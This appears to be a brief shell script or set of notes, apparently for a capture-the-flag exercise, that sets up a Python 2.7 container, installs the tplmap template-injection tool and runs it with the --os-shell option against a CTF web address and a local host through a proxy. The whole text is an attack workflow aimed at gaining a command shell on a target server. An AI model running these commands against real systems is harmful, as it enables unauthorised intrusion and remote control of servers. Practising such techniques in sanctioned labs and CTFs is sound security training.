podman run -it docker.io/lmurawsk/python2.7:latest /bin/bash
export proxy_ip=$(echo $(python -c "import os; a = os.popen(\"ip addr | grep -E -o '([0-9]{1,3}[\.]){3}[0-9]{1,3}'\").read().split('\n')[1]; a = a.split('.')[:-1]; print('.'.join(a) + '.1')"))
cd /opt
update_tplmap(){
	git clone https://github.com/epinna/tplmap
	cd tplmap/
	pip install -r requirements.txt
}

./tplmap.py -h
./tplmap.py --proxy=$proxy_ip:8080 --os-shell -u http://rr-ctf.nl:8005/?name=test
./tplmap.py --proxy=$proxy_ip:8080 --os-shell -u http://$proxy_ip:8000?name=
#update_tplmap     #need to update first before using it